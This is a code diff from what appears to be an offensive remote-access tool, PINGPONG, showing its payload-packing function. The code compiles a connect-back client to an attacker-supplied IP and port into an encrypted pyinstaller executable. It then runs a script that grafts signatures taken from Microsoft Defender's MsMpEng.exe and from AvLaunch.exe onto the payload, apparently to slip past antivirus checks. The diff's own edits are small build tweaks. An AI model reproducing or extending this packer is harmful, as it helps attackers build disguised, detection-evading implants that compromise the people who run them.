@@ -116,7 +116,7 @@ def pack(payload, printf, upx_command, file_format, is_ask=True, is_ask_ip='', i
 		current_path = abspath(__file__)
 		father_path = abspath(dirname(current_path) + sep + ".")
 		f_father_path = abspath(dirname(father_path) + sep + ".")
-		command = f"pyinstaller -p {install_path}/Lib/site-packages -F payload/payload.py {upx_command} -w --log-level FATAL"
+		command = f"pyinstaller -p {install_path}/Lib/site-packages -F payload/payload.py {upx_command} -w --log-level CRITICAL --key {key}"
 		command_sign_1 = f"python {father_path}/sign.py -i {father_path}/sign_sample/MsMpEng.exe -t {father_path}/upload_payload/PINGPONG_payload.exe -o {father_path}/upload_payload/PINGPONG_payload_sign.exe"
 		command_sign_2 = f"python {father_path}/sign.py -i {father_path}/sign_sample/AvLaunch.exe -t {father_path}/upload_payload/PINGPONG_payload.exe -o {father_path}/upload_payload/PINGPONG_payload_sign_twice.exe"
 
@@ -149,7 +149,7 @@ def pack(payload, printf, upx_command, file_format, is_ask=True, is_ask_ip='', i
 			if not is_basic_payload:
 				if isfile("payload.exe"):
 					remove("payload.exe")
-				basic_command = f"pyinstaller -p {install_path}/Lib/site-packages -F payload/_basic_conn_tmp.py {upx_command} -w --log-level FATAL"
+				basic_command = f"pyinstaller -p {install_path}/Lib/site-packages -F payload/_basic_conn_tmp.py {upx_command} -w --key {key} --log-level CRITICAL "
 				with open('payload/_basic_conn.py', 'r') as p:
 					basic_pay = p.read()
 				with open('payload/_basic_conn_tmp.py', 'w') as a:
@@ -198,7 +198,7 @@ PINGPONG_client("{ip}", {port})""")
 				rmtree("dist")
 			except(ImportError):
 				main.print_warn("payload>[*]You might not install pyinstaller, installing it now......")
-				system('pip install pyinstaller')
+				system('pip install pyinstaller==5.6.2')
 				if printf:
 					print("payload>[*]re-packing")
 				system(command)
@@ -206,7 +206,7 @@ PINGPONG_client("{ip}", {port})""")
 				if printf:
 					main.print_normal("payload>[*]Something wrong when deleting temp files, but it doesn't really matter")
 					main.print_warn("payload>[!]The payload file may be in the dir: ./dict")
-			main.print_good("payload>[*]signing......")
+			main.print_normal("payload>[*]signing......")
 			system(command_sign_1)
 			system(command_sign_2)
 			remove(f"{father_path}/upload_payload/PINGPONG_payload_sign.exe")
